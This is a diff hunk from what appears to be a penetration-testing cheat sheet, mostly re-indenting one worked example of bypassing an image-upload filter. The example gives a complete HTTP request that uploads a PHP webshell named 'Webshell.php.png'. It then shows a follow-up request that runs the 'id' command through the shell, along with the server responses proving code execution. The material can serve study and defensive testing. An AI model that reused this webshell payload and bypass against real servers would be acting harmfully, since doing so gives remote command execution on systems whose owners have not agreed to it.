@@ -345,61 +345,61 @@ Example
 ➤ Step 1. You found a vulnerable image file upload function "image_upload.php".
           You tried to upload a php webshell named "Webshell.php" but it is rejected (only .png, .gif and .jpg files are accepted)
 
-➤ Step 2. Simply modify the file extension of your webshell like "Webshell.php.png" to 'bypass' the extension file format filtering control
+➤ Step 2. Simply modify the file extension of your webshell like "Webshell.php.png" to 'bypass' the file format check based on the file extension
           - Using Burp proxy send the following POST HHTP request:
 	  
-          POST /application/image_upload.php HTTP/1.1
-          Host: x.x.x.x
-          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
-          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-          Accept-Language: en-US,en;q=0.5
-          Accept-Encoding: gzip, deflate
-          Referer: http://x.x.x.x/application/upload.php
-          Cookie: PHPSESSID=4e2jkta5ovnligfe6bchjgsop5
-          Connection: close
-          Upgrade-Insecure-Requests: 1
-          Content-Type: multipart/form-data; boundary=---------------------------9005578534749094731954750866
-          Content-Length: 409
+            POST /application/image_upload.php HTTP/1.1
+            Host: x.x.x.x
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Referer: http://x.x.x.x/application/upload.php
+            Cookie: PHPSESSID=4e2jkta5ovnligfe6bchjgsop5
+            Connection: close
+            Upgrade-Insecure-Requests: 1
+            Content-Type: multipart/form-data; boundary=---------------------------9005578534749094731954750866
+            Content-Length: 409
 
-          -----------------------------9005578534749094731954750866
-          Content-Disposition: form-data; name="fileToUpload"; filename="Webshell.php.png"
-          Content-Type: application/x-php
+            -----------------------------9005578534749094731954750866
+            Content-Disposition: form-data; name="fileToUpload"; filename="Webshell.php.png"
+            Content-Type: application/x-php
 
-          <?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>
+            <?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>
 
-          -----------------------------9005578534749094731954750866
-          Content-Disposition: form-data; name="submit"
+            -----------------------------9005578534749094731954750866
+            Content-Disposition: form-data; name="submit"
 
-          Upload Image
-          -----------------------------9005578534749094731954750866--
+            Upload Image
+            -----------------------------9005578534749094731954750866--
 
-  	  HTTP response:
-          HTTP/1.1 302 Found
-          <snip>
-          location: main_login.php
-          Content-Length: 104
-          Connection: close
-          Content-Type: text/html; charset=UTF-8
+            HTTP response:
+            HTTP/1.1 302 Found
+            <snip>
+            location: main_login.php
+            Content-Length: 104
+            Connection: close
+            Content-Type: text/html; charset=UTF-8
 
-          <html>
-          <body>
-          Uploading, please wait<br />The file has been uploaded to /uploads <br /></body>
-          </html>
+            <html>
+            <body>
+            Uploading, please wait<br />The file has been uploaded to /uploads <br /></body>
+            </html>
 
 ➤ Step 3. Browse your webshell and execute OS commands 
           - Using Burp proxy send the following POST HHTP request:
 
-          GET /application/uploads/Webshell.php.png?cmd=id HTTP/1.1
-          Host: 192.168.1.49
-          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+            GET /application/uploads/Webshell.php.png?cmd=id HTTP/1.1
+            Host: x.x.x.x
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
 
-  	  HTTP response:
-          HTTP/1.1 200 OK
-          <SNIP>
-          Connection: close
-          Content-Type: text/html; charset=UTF-8
+            HTTP response:
+            HTTP/1.1 200 OK
+            <SNIP>
+            Connection: close
+            Content-Type: text/html; charset=UTF-8
 
-          uid=48(apache) gid=48(apache) groups=48(apache)
+            uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 
 ##### Technique 8 - Webshell upload by exploiting an insecure (writable) file share (CIFS) of a Windows IIS Web server (i.e., C:\inetpub\wwwroot\)
